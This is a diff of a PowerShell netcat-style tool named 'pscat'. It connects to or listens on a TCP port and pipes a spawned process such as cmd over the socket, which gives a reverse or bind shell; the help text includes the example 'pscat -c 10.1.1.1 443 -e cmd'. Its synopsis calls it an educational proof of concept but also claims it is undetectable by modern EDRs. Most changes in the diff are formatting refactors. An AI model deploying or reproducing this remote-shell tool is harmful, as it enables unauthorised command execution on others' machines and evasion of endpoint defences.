@@ -1,13 +1,11 @@
-class stream
-{
+class stream {
     [String]       $Name
     [IO.Stream]    $IOStream
     [Byte[]]       $Buffer
     [IAsyncResult] $AsyncResult
 }
 
-class pscat
-{
+class pscat {
     [String]         $Address
     [String]         $Port
     [String]         $Command
@@ -16,8 +14,7 @@ class pscat
     [Object[]]       $Streams
     [Bool]           $RedirectorPresent
 
-    pscat ([String] $Address, [String] $Port)
-    {
+    pscat ([String] $Address, [String] $Port) {
         $this.Address                   = $Address
         $this.Port                      = $Port
         $this.Command                   = ""
@@ -30,17 +27,12 @@ class pscat
         $this.RedirectorPresent         = [Console]::IsInputRedirected
     }
 
-    [Bool] Start_Connect([Bool] $Verbosity = $false)
-    {
-        if ($Verbosity)
-        {
+    [Bool] Start_Connect([Bool] $Verbosity = $false) {
+        if ($Verbosity) {
            Write-Host "connecting [$($this.Address)] $($this.Port) ..."
         }
 
-        $TcpClient                      = [Net.Sockets.TcpClient]::new($this.Address, $this.Port)
-
-        if (-not $TcpClient)
-        {
+        if (-not ($TcpClient = [Net.Sockets.TcpClient]::new($this.Address, $this.Port))) {
             return $false
         }
 
@@ -49,41 +41,34 @@ class pscat
         return $true
     }
 
-    [Bool] Start_Listen([Bool] $Verbosity = $false)
-    {
-        if ($Verbosity)
-        {
+    [Bool] Start_Listen([Bool] $Verbosity = $false) {
+        if ($Verbosity) {
             Write-Host "listening on [$($this.Address)] $($this.Port) ..."
         }
         
         $TcpListener                    = [Net.Sockets.TcpListener]::new($this.Address, $this.Port)
         $TcpListener.Start()
-        $TcpClient                      = $TcpListener.AcceptTcpClient()
+        
+        if (-not ($TcpClient = $TcpListener.AcceptTcpClient())) {
+            return $false
+        }
 
         $LocalConnectionAddress         = $TcpClient.Client.LocalEndPoint.Address
         $RemoteConnectionAddress        = $TcpClient.Client.RemoteEndPoint.Address
         $RemoteConnectionPort           = $TcpClient.Client.RemoteEndPoint.Port
 
-        if ($Verbosity)
-        {
+        if ($Verbosity) {
             Write-Host "connect to [$LocalConnectionAddress] from [$RemoteConnectionAddress] $RemoteConnectionPort"
         }
         
-        if (-not $TcpClient)
-        {
-            return $false
-        }
-
         $TcpListener.Stop()
         $this.Objects.TcpClient         = $TcpClient
 
         return $true
     }
 
-    [Bool] Add_TcpClient([Net.Sockets.TcpClient] $TcpClient)
-    {
-        if ($TcpClient.Connected)
-        {
+    [Bool] Add_TcpClient([Net.Sockets.TcpClient] $TcpClient) {
+        if ($TcpClient.Connected) {
             $this.Objects.TcpClient     = $TcpClient
             return $true
         }
@@ -91,8 +76,7 @@ class pscat
         return $false
     }
 
-    [Bool] Start_DiagnosticsProcess([String] $ProcessName, [String] $Arguments)
-    {
+    [Bool] Start_DiagnosticsProcess([String] $ProcessName, [String] $Arguments) {
         $Info                           = [Diagnostics.ProcessStartInfo]::new()
         $Info.FileName                  = $ProcessName
         $Info.Arguments                 = $Arguments
@@ -100,9 +84,8 @@ class pscat
         $Info.RedirectStandardInput     = $true
         $Info.RedirectStandardOutput    = $true
         $Info.RedirectStandardError     = $true
-        $Process                        = [Diagnostics.Process]::Start($Info)
-
-        if (-not $Process)
+        
+        if (-not ($Process = [Diagnostics.Process]::Start($Info)))
         {
             return $false
         }
@@ -112,16 +95,14 @@ class pscat
         return $true
     }
 
-    [Object[]] Start_AsyncRead([IO.Stream] $Stream)
-    {
+    [Object[]] Start_AsyncRead([IO.Stream] $Stream) {
         $ReadingBuffer                  = [Byte[]]::new(65535)
         $ReadingOperation               = $Stream.BeginRead($ReadingBuffer, 0, $ReadingBuffer.Length, $null, $null)
 
         return $ReadingBuffer, $ReadingOperation
     }
 
-    [Stream] Make_Stream([String] $Name, [IO.Stream] $IOStream, [Byte[]] $Buffer, [IAsyncResult] $AsyncResult)
-    {
+    [Stream] Make_Stream([String] $Name, [IO.Stream] $IOStream, [Byte[]] $Buffer, [IAsyncResult] $AsyncResult) {
         $Stream                         = [Stream]::new()
         $Stream.Name                    = $Name
         $Stream.IOStream                = $IOStream
@@ -131,40 +112,31 @@ class pscat
         return $Stream
     }
 
-    [Void] Setup_Streams()
-    {
-        if ($this.Objects.TcpClient)
-        {
+    [Void] Setup_Streams() {
+        if ($this.Objects.TcpClient) {
             $IOStream                   = $this.Objects.TcpClient.GetStream()
             $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)
-
             $this.Streams              += $this.Make_Stream("TcpStream", $IOStream, $ReadBuffer, $ReadOp)
         }
 
-        if ($this.RedirectorPresent)
-        {
+        if ($this.RedirectorPresent) {
             $IOStream                   = [Console]::OpenStandardInput()
             $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)
-
             $this.Streams              += $this.Make_Stream("StdInStream", $IOStream, $ReadBuffer, $ReadOp)
         }
 
-        if ($this.Objects.Process)
-        {
+        if ($this.Objects.Process) {
             $IOStream                   = $this.Objects.Process.StandardOutput.BaseStream
             $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)
-
             $this.Streams              += $this.Make_Stream("StdOutStream", $IOStream, $ReadBuffer, $ReadOp)
 
             $IOStream                   = $this.Objects.Process.StandardError.BaseStream
             $ReadBuffer, $ReadOp        = $this.Start_AsyncRead($IOStream)
-
             $this.Streams              += $this.Make_Stream("StdErrStream", $IOStream, $ReadBuffer, $ReadOp)
         }
     }
 
-    [Bool] Send_InitialData([String] $InitialData)
-    {
+    [Bool] Send_InitialData([String] $InitialData) {
         $InitialData                   += "`n"
         $RawData                        = $this.Encoding.GetBytes($InitialData)
         $this.Streams[0].IOStream.Write($RawData, 0, $RawData.Length)
@@ -173,17 +145,12 @@ class pscat
         return $true
     }
 
-    [String] Process_Streams([Int] $StreamIndex)
-    {
+    [String] Process_Streams([Int] $StreamIndex) {
         $Stream                         = $this.Streams[$StreamIndex]
         $Data                           = $null
 
-        if ($Stream.AsyncResult.IsCompleted)
-        {
-            $Length                     = $Stream.IOStream.EndRead($Stream.AsyncResult)
-
-            if ($Length -eq 0)
-            {
+        if ($Stream.AsyncResult.IsCompleted) {
+            if (-not ($Length = $Stream.IOStream.EndRead($Stream.AsyncResult))) {
                 return $null
             }
 
@@ -196,68 +163,50 @@ class pscat
         return $Data
     }
 
-    [Void] Update_DiagnosticsProcess()
-    {
-        foreach ($Stream in 0..2)
-        {
-            $Data                       = $this.Process_Streams($Stream)
-            $Bytes                      = $this.Encoding.GetBytes($Data)
-
-            if ($Data -eq $null)
-            {
+    [Void] Update_DiagnosticsProcess() {
+        foreach ($Stream in 0..2) {
+            if (-not ($Data = $this.Process_Streams($Stream))) {
                 continue
             }
 
-            if ($Stream -eq 0)
-            {
+            $Bytes                      = $this.Encoding.GetBytes($Data)
+
+            if ($Stream -eq 0) {
                 $this.Objects.Process.StandardInput.BaseStream.Write($Bytes, 0, $Bytes.Length)
                 $this.Objects.Process.StandardInput.BaseStream.Flush()
-            }
-            else
-            {
+            } else {
                 $this.Streams[0].IOStream.Write($Bytes, 0, $Bytes.Length)
                 $this.Streams[0].IOStream.Flush()
             }
         }
     }
 
-    [Void] Update_Console()
-    {
+    [Void] Update_Console() {
         $KeyPressed                     = [Console]::ReadKey($true)
         $CursorPosition                 = [Console]::CursorLeft
 
-        if ($KeyPressed.Key -eq "Enter")
-        {
+        if ($KeyPressed.Key -eq "Enter") {
             $this.Command              += "`n"
             $RawCommand                 = $this.Encoding.GetBytes($this.Command)
             $this.Streams[0].IOStream.Write($RawCommand, 0, $RawCommand.Length)
             $this.Streams[0].IOStream.Flush()
             [Console]::WriteLine()
             $this.Command               = ""
-        }
-        elseif ($KeyPressed.Key -eq "Backspace") 
-        {
-            if ($this.Command.Length -gt 0) 
-            {
+        } elseif ($KeyPressed.Key -eq "Backspace") {
+            if ($this.Command.Length -gt 0)  {
                 $this.Command           = $this.Command.Substring(0, $this.Command.Length - 1)
                 [Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop)
                 [Console]::Write(" ")
                 [Console]::SetCursorPosition([Console]::CursorLeft - 1, [Console]::CursorTop)
             }
-        }
-        else
-        {
+        } else {
             $this.Command              += $KeyPressed.KeyChar
             [Console]::Write($KeyPressed.KeyChar)
         }
     }
 
-    [Void] Update_Redirector()
-    {
-        $Data                           = $this.Process_Streams(1)
-
-        if (-not $Data)
-        {
+    [Void] Update_Redirector() {
+        if (-not ($Data = $this.Process_Streams(1))) {
             return
         }
 
@@ -266,53 +215,42 @@ class pscat
         $this.Streams[0].IOStream.Flush()
     }
 
-    [Void] Update_TcpConnection()
-    {
-        $Data                           = $this.Process_Streams(0)
-
-        if ($Data)
-        {
+    [Void] Update_TcpConnection() {
+        if ($Data = $this.Process_Streams(0)) {
             [Console]::Write($Data)
         }
 
-        if ($this.RedirectorPresent)
-        {
+        if ($this.RedirectorPresent) {
             $this.Update_Redirector()
             return
         }
 
-        if ([Console]::KeyAvailable) 
-        {
+        if ([Console]::KeyAvailable) {
             $this.Update_Console()
         }
     }
 
-    [Void] Close_Streams()
-    {
-        foreach ($Stream in $this.Streams)
-        {
+    [Void] Close_Streams() {
+        foreach ($Stream in $this.Streams) {
             $Stream.IOStream.Close()
         }
 
-        if ($this.Objects.TcpClient)
-        {
+        if ($this.Objects.TcpClient) {
             $this.Objects.TcpClient.Close
         }
 
-        if ($this.Objects.Process)
-        {
+        if ($this.Objects.Process) {
             $this.Objects.Process.Kill()
         }
     }
 }
 
-function pscat
-{
+function pscat {
 <#
 .SYNOPSIS
     This is a simple proof-of-concept (POC) for a network concatenation tool usuing PowerShell and the .NET framework.
     
-    There’s nothing novel here — this method is well-known and widely used. Luckily, it’s and amazing network 
+    There's nothing novel here. This method is well-known and widely used. Luckily, it's an amazing network 
     administration tool that is not detectable by modern EDRs and serves primarily as an educational demonstration.
     
     Notes:
@@ -358,11 +296,11 @@ function pscat
         [Parameter()]
         [Switch] $VerboseMode,
 
-        [Parameter()]
-        [Switch] $Help,
-
         [Parameter(ValueFromPipeline)]
-        [String] $Data
+        [String] $Data,
+
+        [Parameter(ParameterSetName = 'Help', Position = 0)]
+        [Switch] $Help
     )
 
     $HelpDialogue                       = @"
@@ -392,102 +330,81 @@ Examples:
       pscat -c 10.1.1.1 443 -e cmd -verbosemode
 "@
 
-    if ($Help)
-    {
+    if ($Help) {
         return $HelpDialogue
     }
 
-    if ((-not $Connect) -and (-not  $Listen) -and (-not $UtilizeGuestClient))
-    {
-        if ($VerboseMode)
-        {
+    if ((-not $Connect) -and (-not  $Listen) -and (-not $UtilizeGuestClient)) {
+        if ($VerboseMode) {
             Write-Host "please specify connect/listen/utilize."
         }
         return
     }
 
-    if ($Connect -and ((-not $Address) -or (-not $Port)))
-    {
-        if ($VerboseMode)
-        {
+    if ($Connect -and ((-not $Address) -or (-not $Port))) {
+        if ($VerboseMode) {
             Write-Host "please specify full address []:[]."
         }
         return
     }
 
-    if ($Listen -and -not $Address)
-    {
+    if ($Listen -and -not $Address) {
         $Address                        = [Net.IPAddress]::Any
     }
 
-    if ($Listen -and (-not $Port))
-    {
-        if ($VerboseMode)
-        {
+    if ($Listen -and (-not $Port)) {
+        if ($VerboseMode) {
             Write-Host "please specify full address []:[]."
         }
         return
     }
 
-    if ($UtilizeGuestClient -and (-not $GuestClient))
-    {
-        if ($VerboseMode)
-        {
+    if ($UtilizeGuestClient -and (-not $GuestClient)) {
+        if ($VerboseMode) {
             Write-Host "please specify client."
         }
         return
     }
 
-    if ($Connect -or $Listen)
-    {
+    if ($Connect -or $Listen) {
         $TcpClient                      = [pscat]::new($Address, $Port)
     }
     
-    if ($UtilizeGuestClient)
-    {
+    if ($UtilizeGuestClient) {
         $TcpClient                      = [pscat]::new($null, $null)
     }
 
-    if ($Connect)
-    {
+    if ($Connect) {
         $RESULT                         = $TcpClient.Start_Connect($VerboseMode)
     }
 
-    if ($Listen)
-    {
+    if ($Listen) {
         $RESULT                         = $TcpClient.Start_Listen($VerboseMode)
     }
 
-    if ($UtilizeGuestClient)
-    {
+    if ($UtilizeGuestClient) {
         $RESULT                         = $TcpClient.Add_TcpClient($GuestClient)
     }
 
-    if (-not $RESULT)
-    {
-        if ($VerboseMode)
-        {
+    if (-not $RESULT) {
+        if ($VerboseMode) {
             Write-Host "failed to connect to host."
         }
         return
     }
 
-    if ($Execute)
-    {
+    if ($Execute) {
         $CommandLine                    = @($Execute -split '\s+', 2)
         $Executable                     = $CommandLine[0]
 
-        if ($CommandLine.Count -gt 1)
-        {
+        if ($CommandLine.Count -gt 1) {
             $Arguments                 = $CommandLine[1]
         }
 
         $RESULT                         = $TcpClient.Start_DiagnosticsProcess($Executable, $Arguments)
 
-        if (-not $RESULT)
-        {
-            if ($VerboseMode)
-            {
+        if (-not $RESULT) {
+            if ($VerboseMode) {
                 Write-Host "failed to start process."
             }
             return
@@ -496,8 +413,7 @@ Examples:
 
     $TcpClient.Setup_Streams()
 
-    if ($Data)
-    {
+    if ($Data) {
         $RESULT                         = $TcpClient.Send_InitialData($Data)
     }
 
@@ -512,15 +428,11 @@ Examples:
 
     $Mode                               = $Action[[Bool] $Execute]
 
-    try
-    {
-        while ($true)
-        {
+    try {
+        while ($true) {
             & $Mode
         }
-    }
-    finally
-    {
+    } finally {
         $TcpClient.Close_Streams()
     }
 }
